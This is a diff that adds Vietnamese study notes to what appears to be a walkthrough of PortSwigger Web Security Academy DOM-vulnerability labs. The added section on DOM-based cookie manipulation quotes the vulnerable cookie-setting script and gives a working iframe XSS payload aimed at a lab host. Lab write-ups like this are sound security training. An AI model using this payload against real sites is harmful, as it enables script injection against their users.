@@ -70,8 +70,20 @@ https://0a090019036a93cfc0cb4f42007c009e.web-security-academy.net/post?postId=1&
 
 5: DOM-based cookie manipulation
 
+Ở các post sẽ có một dòng như sau
+
+<script>
+    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
+</script>
+
+Để Js inject được, ta thêm tag script print vào sau kí tự #, tiếp theo đổi địa chỉ src thành trang chủ
+
+<iframe src="https://0aa30022036047bbc047d20b005400ce.web-security-academy.net/product?productId=1#'><script>print()</script>" onload="this.src='https://0aa30022036047bbc047d20b005400ce.web-security-academy.net'">
+
 
 6: Exploiting DOM clobbering to enable XSS
+
+
 
 
 7: Clobbering DOM attributes to bypass HTML filters
